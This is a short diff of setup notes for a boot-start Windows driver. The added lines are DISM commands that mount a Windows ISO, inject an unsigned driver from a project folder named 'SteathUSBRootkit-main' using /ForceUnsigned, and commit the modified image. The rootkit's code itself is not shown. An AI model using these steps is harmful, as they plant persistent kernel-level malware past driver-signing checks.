@@ -7,3 +7,7 @@ ServiceBinary  = %12%\YourDriver.sys
 LoadOrderGroup = "Base"     ; Or another appropriate group, check group importance for driver and create dependencies for FS and so on
 - Add to ISO using https://learn.microsoft.com/en-us/windows-hardware/drivers/install/installing-a-boot-start-driver
 https://issuu.com/hamzamac/docs/cs203_assignment1
+Dism /Mount-Image /ImageFile:C:\Users\shaygil\downloads\Windows.iso /MountDir:C:\test-mount
+Dism /Image:C:\test-mount /Add-Driver /Driver:"C:\Users\shaygil\Downloads\SteathUSBRootkit-main (1)\SteathUSBRootkit-main\BootStart\x64\Release\BootStart.inf"  /ForceUnsigned
+Dism /Image:C:\test-mount /Get-Drivers for testing 
+Dism /Unmount-Image /MountDir:C:\test-mount /Commit
